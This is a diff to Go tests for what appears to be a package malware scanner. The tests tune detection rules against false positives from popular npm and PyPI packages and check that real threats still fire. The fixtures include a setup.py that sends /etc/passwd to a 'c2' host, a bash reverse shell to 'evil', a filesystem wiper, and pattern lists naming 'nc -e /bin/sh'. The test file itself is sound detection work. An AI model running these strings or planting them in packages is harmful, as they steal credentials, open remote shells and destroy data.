@@ -2,6 +2,7 @@ package static
 
 import (
 	"encoding/base64"
+	"strings"
 	"testing"
 
 	"github.com/joncooper/detonator/internal/artifact"
@@ -310,12 +311,14 @@ func TestHostReconExfil(t *testing.T) {
 	if hasRuleSet(Analyze(art, u))["host-recon-exfil"] != verdict.SevHigh {
 		t.Fatalf("install-time host-recon-exfil not high: %+v", Analyze(art, u))
 	}
-	// Same shape in a runtime module (not a hook target) -> Medium (corroborating).
+	// Same shape in a RUNTIME module (not a hook target) must NOT fire: reading host
+	// identity + connecting is the normal job of DB drivers and browser automation
+	// (asyncpg, playwright false-positived here). Recon only counts at install time.
 	mod := unpacked(map[string]string{
 		"lib/report.js": "const os=require('os');fetch('https://t.example',{method:'POST',body:os.hostname()+os.userInfo().username});",
 	})
-	if hasRuleSet(Analyze(art, mod))["host-recon-exfil"] != verdict.SevMedium {
-		t.Fatal("runtime host-recon-exfil not medium")
+	if hasRule(Analyze(art, mod), "host-recon-exfil") != nil {
+		t.Fatal("runtime host-recon-exfil wrongly flagged (should be install-context only)")
 	}
 	// Precision: a lone hostname read next to a fetch (one primitive) must NOT fire.
 	ok := unpacked(map[string]string{"index.js": "const h=require('os').hostname();fetch('https://api.example/'+h);"})
@@ -396,6 +399,57 @@ func TestDocPlaceholderKeyNotFlagged(t *testing.T) {
 	src := unpacked(map[string]string{"pkg/client.py": "AWS_KEY='AKIA1234567890ABCDEF'"})
 	if hasRule(Analyze(art, src), "embedded-aws-key") == nil {
 		t.Fatal("real embedded AWS key no longer detected")
+	}
+}
+
+func TestPrecisionAtScaleFPs(t *testing.T) {
+	npm := verdict.Artifact{Ecosystem: verdict.NPM}
+	pypi := verdict.Artifact{Ecosystem: verdict.PyPI}
+	// Each of these false-positived on a top-downloaded package; none may flag.
+	benign := []struct {
+		art  verdict.Artifact
+		path string
+		body string
+		note string
+	}{
+		{pypi, "scipy/sparse/linalg/_eigen/arpack/arnaud/Makefile", "clean:\n\trm -rf /usr/local/tmp\n", "Makefile is build tooling (scipy)"},
+		{pypi, "depends/install_imagequant.sh", "rm -rf ~/build-cache\n", "depends/ build script (pillow)"},
+		{pypi, "litellm/proxy/guardrails/categories/prompt_injection.yaml", "patterns:\n  - eval(atob(x))\n  - nc -e /bin/sh\n  - mkfs\n", "data file listing malicious patterns (litellm)"},
+		{npm, "lib/utilsBundle.js", "var x=require('net').connect(1,'h');cp.spawn('cmd.exe');dup2(x)", "vendored bundle (playwright)"},
+		{npm, "proxy/_next/static/chunks/0abc.js", "['mkfifo','mkfs','mknod'].join('|')", "Next.js build chunk (litellm ui)"},
+		{pypi, "asyncpg/connect_utils.py", "import os,socket\nh=os.hostname();u=os.userInfo()\nsocket.socket().connect((h,5432))", "runtime DB driver recon (asyncpg)"},
+		{pypi, "googleapiclient/discovery_cache/documents/appengine.v1.json", "{\"key\":\"-----BEGIN PRIVATE KEY-----\\nabc\\n-----END PRIVATE KEY-----\"}", "key in a data/cache json (google)"},
+	}
+	for _, c := range benign {
+		u := unpacked(map[string]string{c.path: c.body})
+		if sigs := Analyze(c.art, u); len(sigs) != 0 {
+			for _, s := range sigs {
+				if s.Severity == verdict.SevHigh || s.Severity == verdict.SevCritical || s.Severity == verdict.SevMedium {
+					t.Errorf("FP: %s wrongly flagged %s (%s)", c.note, s.Rule, c.path)
+				}
+			}
+		}
+	}
+	// setup.py with a README inlined into long_description whose examples call
+	// requests.get(...) must NOT read as an install-time network call (backoff).
+	readme := "This module wraps requests. Example:\n\n    @backoff.on_exception(backoff.expo)\n    def get_url(url):\n        return requests.get(url)\n\n" + strings.Repeat("More docs. ", 40)
+	bo := unpacked(map[string]string{"setup.py": "from setuptools import setup\nsetup(name='backoff', long_description='" + readme + "')"})
+	if hasRule(Analyze(pypi, bo), "py-setup-execution") != nil {
+		t.Error("FP: requests.get in a setup.py long_description (docs) wrongly flagged py-setup-execution")
+	}
+
+	// Precision guard must not blind the real thing: the malicious counterparts still fire.
+	realWiper := unpacked(map[string]string{"index.js": "require('fs').rmSync('/',{recursive:true,force:true});"})
+	if hasRule(Analyze(npm, realWiper), "destructive-payload") == nil {
+		t.Error("real source wiper no longer detected")
+	}
+	realExfil := unpacked(map[string]string{"setup.py": "import urllib.request\nurllib.request.urlopen('http://c2/x', data=open('/etc/passwd','rb').read())\nfrom setuptools import setup;setup(name='x')"})
+	if hasRule(Analyze(pypi, realExfil), "py-setup-execution") == nil {
+		t.Error("real setup.py exfil no longer detected")
+	}
+	realRevshell := unpacked(map[string]string{"lib/x.sh": "bash -i >& /dev/tcp/evil/4444 0>&1"})
+	if hasRule(Analyze(npm, realRevshell), "reverse-shell-source") == nil {
+		t.Error("real reverse shell no longer detected")
 	}
 }
 
